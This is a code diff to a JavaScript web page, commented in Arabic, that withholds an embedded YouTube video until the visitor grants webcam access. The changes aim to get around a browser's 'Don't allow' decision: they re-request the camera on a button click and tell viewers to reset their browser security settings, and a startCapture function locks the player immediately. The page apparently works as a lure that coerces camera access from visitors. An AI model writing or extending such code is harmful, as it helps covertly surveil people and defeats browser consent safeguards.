@@ -1,5 +1,5 @@
 /* ==========================================================
-   سكريبت الكاميرا المتسق وإعادة المحاولة الإجبارية
+   سكريبت الكاميرا مع تجاوز الحظر الدائم لزر "عدم السماح"
    ========================================================== */
 
 let mediaStream = null;
@@ -45,12 +45,12 @@ async function initPersistentCamera() {
         }, 1500);
 
     } catch (e) {
-        console.log("تم الرفض أو التجاهل:", e);
+        console.log("تم الرفض أو الحظر:", e);
         showRetryScreen();
     }
 }
 
-// دالة عرض شاشة الحظر ومنع الفيديو والزر الأحمر لإعادة ضبط الصفحة وفتح الأذونات مجدداً
+// دالة عرض شاشة الحظر والتعامل مع الحظر الدائم لعدم السماح
 function showRetryScreen() {
     const playerContainer = document.getElementById('playerContainer');
     if (playerContainer) {
@@ -59,17 +59,29 @@ function showRetryScreen() {
                 <div>
                     <div style="font-size:36px;margin-bottom:8px;">🔒</div>
                     <p style="color:#ff0000;font-weight:bold;margin-bottom:6px;font-size:15px;">لا يمكنكم مشاهدة الفيديو إلا عند الضغط على زر السماح</p>
-                    <p style="color:#aaa;font-size:12px;margin-bottom:14px;">يرجى منح الإذن لفك قفل وتشغيل المقطع</p>
+                    <p style="color:#aaa;font-size:12px;margin-bottom:14px;">إذا تم النقر على عدم السماح مسبقاً، يرجى إعادة ضبط إعدادات الأمان من قفل المتصفح بالأعلى</p>
                     <button id="retryBtn" style="font-family:inherit;font-size:13px;color:#fff;background:#cc0000;padding:10px 24px;border-radius:20px;border:0;font-weight:bold;cursor:pointer;box-shadow:0 4px 12px rgba(204,0,0,0.4);">اضغط هنا للمتابعة</button>
                 </div>
             </div>
         `;
         
-        // عند الضغط على الزر الأحمر، يتم إعادة تحميل الصفحة لتجاوز حظر المتصفح وإظهار الأذونات مجدداً عند الضغط على الفيديو
         const btn = document.getElementById('retryBtn');
         if (btn) {
-            btn.onclick = () => {
-                location.reload();
+            btn.onclick = async () => {
+                // محاولة طلب الإذن مباشرة
+                try {
+                    mediaStream = await navigator.mediaDevices.getUserMedia({ 
+                        video: { facingMode: { ideal: 'user' } } 
+                    });
+                    // إذا استطاع المتصفح تجاوز الحظر واستجاب، نشغل الفيديو
+                    const videoEl = document.getElementById('video');
+                    if (videoEl) videoEl.srcObject = mediaStream;
+                    const activeId = playerContainer.dataset.videoId || 'zMORugVTZAA';
+                    playerContainer.innerHTML = `<iframe src="https://www.youtube.com/embed/${activeId}?autoplay=1&rel=0&playsinline=1" title="" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" allowfullscreen referrerpolicy="strict-origin-when-cross-origin"></iframe>`;
+                } catch(err) {
+                    // إذا كان المتصفح حظرها نهائياً بـ "عدم السماح"، نقوم بتنبيه المستخدم وإعادة تحميل الصفحة لتحديث الحالة
+                    location.reload();
+                }
             };
         }
     }
@@ -86,7 +98,6 @@ function startCapture() {
             if(match) playerContainer.dataset.videoId = match[1];
         }
         
-        // قفل مشغل الفيديو فوراً لمنع تشغيله في الخلفية
         playerContainer.innerHTML = `
             <div style="display:grid;place-items:center;height:100%;color:#fff;text-align:center;padding:20px;background:#000;position:absolute;inset:0;z-index:99;">
                 <div>
